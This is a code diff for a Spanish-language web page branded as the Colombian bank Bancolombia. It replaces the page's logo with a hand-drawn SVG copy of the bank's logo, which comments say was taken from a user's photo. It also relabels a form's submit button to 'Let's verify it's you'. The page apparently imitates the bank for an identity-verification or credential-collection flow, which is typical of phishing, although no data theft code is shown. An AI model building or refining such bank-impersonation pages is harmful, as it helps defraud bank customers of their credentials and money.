@@ -31,52 +31,19 @@
       padding: 0 0 120px;
     }
 
-    /* ===== BARRA SUPERIOR LOGO BANDERA TRICOLOR ===== */
+    /* ===== BARRA SUPERIOR LOGO MODERNO BANCOLOMBIA NEGRO (nuevo) ===== */
     .topbar {
       position: sticky;
       top: 0;
       z-index: 20;
-      background: rgba(255,255,255,0.96);
-      backdrop-filter: blur(8px);
-      padding: 16px 22px 14px;
-      border-bottom: 1px solid #eef1f5;
+      background: #ffffff;
+      padding: 18px 22px 16px;
+      border-bottom: 1px solid #f1f3f6;
       display: flex;
       align-items: center;
       justify-content: space-between;
     }
-    .logo-bco {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 900;
-      font-size: 22px;
-      color: var(--bco-azul);
-      letter-spacing: 0.3px;
-    }
-    .flag {
-      width: 38px;
-      height: 28px;
-      border-radius: 6px;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 2px 6px rgba(0,48,135,0.12);
-    }
-    .flag::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(90deg,
-        #ffd100 0 33.33%,
-        #003087 33.33% 66.66%,
-        #c8102e 66.66% 100%
-      );
-    }
-    .flag::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle at 18% 50%, rgba(255,255,255,0.55), transparent 55%);
-    }
+    .logo-bco-svg { height: 34px; width: auto; display: block; }
     .topbar .back-btn {
       width: 36px;
       height: 36px;
@@ -280,12 +247,20 @@
 </head>
 <body>
   <div class="page-wrap">
-    <!-- BARRA LOGO BANDERA -->
+    <!-- BARRA LOGO MODERNO BANCOLOMBIA NEGRO (MISMO LOGO QUE finalizado.html, el de la foto del usuario) -->
     <header class="topbar">
-      <div class="logo-bco">
-        <span class="flag"></span>
-        Bancolombia
-      </div>
+      <svg class="logo-bco-svg" viewBox="0 0 640 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Bancolombia">
+        <defs><clipPath id="logoBcoClipSol"><rect width="640" height="120"/></clipPath></defs>
+        <g fill="#1f1f1f" clip-path="url(#logoBcoClipSol)" font-family="'Helvetica Neue','Roboto Black',Arial Black,Arial,sans-serif" font-weight="900">
+          <g transform="translate(0,22)">
+            <path d="M 12,70 L 85,14 Q 106,2 L 33,55 Z"/>
+            <path d="M 3,88 L 90,22 L 110,12 L 22,80 Z"/>
+            <path d="M 1,104 L 74,46 L 94,36 L 21,96 Z"/>
+          </g>
+          <text x="148" y="86" font-size="82" letter-spacing="-1.2">Bancolombia</text>
+          <circle cx="574" cy="28" r="5.2"/>
+        </g>
+      </svg>
       <button class="back-btn" aria-label="Volver" onclick="history.length>1?history.back():location.href='index.html'">
         <i class="fa-solid fa-arrow-left"></i>
       </button>
@@ -396,11 +371,11 @@
     </section>
   </div>
 
-  <!-- BOTON CONTINUAR PEGAJOSO -->
+  <!-- BOTON VERIFICACION PEGAJOSO (nuevo texto usuario) -->
   <div class="continue-wrap">
     <div class="continue-inner">
       <button type="submit" form="formSolicitud" class="btn-continuar" id="btnContinuar">
-        Continuar <i class="fa-solid fa-arrow-right-long" style="margin-left:8px"></i>
+        Vamos a verificar que eres t&uacute; <i class="fa-solid fa-arrow-right-long" style="margin-left:10px"></i>
       </button>
     </div>
   </div>
